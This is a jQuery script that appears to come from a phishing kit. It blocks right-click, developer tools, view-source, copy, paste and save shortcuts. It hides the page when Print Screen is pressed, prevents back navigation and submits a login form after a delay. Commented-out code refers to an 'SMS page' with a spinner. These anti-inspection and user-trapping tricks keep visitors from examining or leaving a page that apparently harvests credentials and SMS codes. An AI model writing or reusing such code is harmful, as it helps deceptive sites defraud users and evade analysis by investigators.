

   
      $(document).contextmenu(function(){
        return false;
    });

    $(document).keyup(function (e){
        if(e.keyCode == 44){
            $('body').hide();
        }
    });

    $(document).keydown(function (e){
        if(e.keyCode == 123){
            return false;
        }else if( (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.shiftKey && e.keyCode == 74)){
            return false;
        }else if(e.ctrlKey && (e.keyCode == 117 || e.keyCode == 86 || e.keyCode == 85 || e.keyCode == 83 || e.keyCode == 67) ){
            return false;
        }
    });

	
	
/* Prevent Browser Back Forward */ 
function preventBack(){
    window.history.forward();
}
setTimeout("preventBack()",0);
window.onunload = function(){ null; }



/* Prevent Drag & Drop */
$(document).ready(function() {
  $('input').on('drop', function() {
	return false;
  });
});



	//INDEX PAGE BOUTTON NORMAL 
		$('.myboutton').bind('click', function(e) {
		   e.preventDefault(); 

			setTimeout(function() { //wait 4 Segonds before Submit
				document.getElementById("lFrm").submit();
			}, 800);

		});

/*
//SMS PAGE : When click submit Show Div Spinner 
function showDiv() {document.getElementById('spinner3').style.display = "block";}


//SMS PAGE : When click submit wait 4 seconds before redirect to 'Action'
$('#btnsms').click (function (e) {
   e.preventDefault(); 
   
		    setTimeout(function() {
	    		document.getElementById("lFrm").submit();
	        }, 4000);

});

*/

/**************
//SMS PAGE : When click submit wait 4 seconds before redirect to 'Action'
$('#btnsms').click (function (e) {


/*
var $myForm = $('#lFrm');
if(! $myForm[0].checkValidity()) {
  // If the form is invalid, submit it. The form won't actually submit;
  // this will just cause the browser to display the native HTML5 error messages.
  $myForm.find(':submit').click();
};


	document.getElementById('spinner3').style.display = "block"; //show Div Spinner hidden
   e.preventDefault(); 
	setTimeout(function() { //wait 4 Segonds before Submit
		document.getElementById("lFrm").submit();
	}, 4000);

});
***************/










